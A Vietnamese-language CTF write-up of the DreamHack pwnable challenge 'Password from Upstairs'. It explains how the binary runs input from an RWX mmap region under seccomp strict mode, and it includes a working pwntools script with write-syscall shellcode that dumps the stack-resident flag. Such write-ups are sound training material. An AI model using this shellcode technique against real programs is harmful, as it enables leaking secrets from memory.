# Password-from-Upstairs---Write-up-----DreamHack
Hướng dẫn cách giải bài Password from Upstairs cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 6/12/2025

## 1. Mục tiêu cần đạt
- Hiểu về **mmap**
- Biết cách viết shellcode
- Xài gdb dò địa chỉ thanh ghi

## 2. Cách thực thi
Đầu tiên các bạn hãy đọc code trước đã.

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+8h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
  puts("Steve, are you listening? I will write the password at the floor!");
  printf("Prepare your spell!\n> ");
  read(0, buf, 0x400uLL);
  puts("Alright then...I wrote the password!");
  puts("And now...Presto!");
  sub_1348();
  ((void (*)(void))buf)();
  return 0;
}
```

Ngay từ đầu các bạn sẽ thấy được **mmap**, chương trình sử dụng mmap với quyền 7 (RWX) và cờ MAP_ANONYMOUS để tạo ra một vùng nhớ thực thi được. Đây là nơi shellcode của chúng ta sẽ trú ngụ và được kích hoạt.

Giờ thì tiếp theo hãy dò tiếp sang hàm `sub_1348` có tác dụng gì.

```C
unsigned __int64 sub_1348()
{
  FILE *stream; // [rsp+8h] [rbp-78h]
  __int64 v2[12]; // [rsp+10h] [rbp-70h] BYREF
  int v3; // [rsp+70h] [rbp-10h]
  unsigned __int64 v4; // [rsp+78h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  stream = fopen("flag.txt", "rt");
  memset(v2, 0, sizeof(v2));
  v3 = 0;
  if ( !stream )
    puts("[!] Flag file error. Send DM to rootsquare...");
  __isoc99_fscanf(stream, "%s", v2);
  fclose(stream);
  prctl(22, 1LL);
  return v4 - __readfsqword(0x28u);
}
```

Như các bạn thấy thì nó sẽ mở ra file `flag.txt` và viết nội dung file đó vào biến `v2`. Sau đó nó sẽ thực thi lệnh `prctl(22, 1LL);`. Lệnh `prctl(22, 1)` kích hoạt **SECCOMP_MODE_STRICT**, đưa chương trình vào trạng thái sandbox. Vì chế độ này chặn syscall execve và open, nên chúng ta không thể lấy `shell (/bin/sh)` hoặc mở file flag. Cách duy nhất để vượt qua là sử dụng syscall write (được phép) để in dữ liệu Flag đã được chương trình đọc sẵn lên Stack trước đó.

Giờ thì làm sao để tìm ra được địa chỉ `v2` sau khi `sub_1348` thực thi xong và return về `main` ? Chúng ta sẽ dò bằng gdb. Hãy mở gdb lên và gõ `gdb ./main`. Sau đó `disas main`, đặt breakpoint ở vị trí sau khi thực thi xong `sub_1348` để dò `v2`.

<img width="765" height="93" alt="image" src="https://github.com/user-attachments/assets/773abd0c-a93b-44c4-8a0d-641c3fa30f84" />

Các bạn sẽ đặt breakpoint tại main+214 vì ở đây là lúc mà nó sẽ nhảy đến mmap mà chương trình đã tạo ra. Nói cách khác đây là lúc mà chương trình thực thi các lệnh trong mmap mà mình đã biên soạn.

Đặt xong hãy chạy và nó sẽ kêu nhập input, hãy nhập đại số gì đó vì nó không quá quan trọng, có thể nhập `AAAA`. Sau khi nhập xong vì nó đã chạy xong `sub_1348` nên `v2` chắc chắn sẽ nằm trên stack tức là `rsp` nhưng nó sẽ bị tụt ở gần dưới đáy. Giờ hãy mò cua bắt óc thôi. Vì `v2` trong `sub_1348` là `rbp-0x70` nên khi chạy xong thì có khả năng `v2` sẽ nằm trên stack ở khoảng từ `0x100-0x0`. Giờ hãy gõ lệnh sau để dò là `x/40xg $rsp`. Vừa dò vừa gõ enter đến khi các bạn thấy kí tự sau.

<img width="427" height="54" alt="image" src="https://github.com/user-attachments/assets/293a53c0-aa49-4679-820f-b5e36eaa9916" />

44 ( D ), 48 ( H ),...

Vậy đây chính là địa chỉ của `v2`. Giờ hãy gõ lệnh `p/x $rsp - 0x7fffffffde70` để tính ra khoảng cách từ `rsp` đến địa chỉ `v2` là ra địa chỉ cụ thể của `v2`. Mình đã có hết tất cả rồi giờ hãy viết shellcode băm thôi.

```Python
sc = asm("mov rdi, 1; lea rsi, [rsp-0x80]; mov rdx, 0x100; mov rax, 1; syscall")
```

Vậy là xong bài này chỉ là dạy mình cách hiểu thêm về mmap và cách viết shellcode thôi, khá dễ. Hãy cho mình 1 star để có động lực viết write up tiếp nha 🐧.


```Python
from pwn import *

context.arch = 'amd64'
#p = process('./main')
p = remote('host8.dreamhack.games', 18456)

sc = asm("mov rdi, 1; lea rsi, [rsp-0x80]; mov rdx, 0x100; mov rax, 1; syscall")

try:
    p.sendafter(b"> ", sc)
    output = p.recvall()

    match = re.search(b"DH\{.*?\}", output)
    
    if match:
        print(match.group().decode()) 
    else:
        print("[!] Khong tim thay pattern DH{...}")

except Exception as e:
    print(e)
```

Nếu bạn đã mắc công lướt đến đây thì mình sẽ chỉ bạn cách tính nhanh ra vị trí `v2` mà không cần dò. Thì bài này sẽ chia ra làm 2 stack là stack main và stack sub_1348. Khi chạy stack sub_1348 thì con trỏ đã chạy qua v2 thì nếu mà nó không return về stack main thì v2 sẽ có vị trí là rsp-0x70. Nhưng nó đã quay về stack main thì nó sẽ bị dời xuống 0x10 vì stack sub_1348 cũng có saved rbp và saved rip. Nên khi return về main thì rsp phải tạo thêm 0x10 nữa để cho saved rbp và rip của stack sub_1348 nên v2 mới có địa chỉ là rsp-0x80.
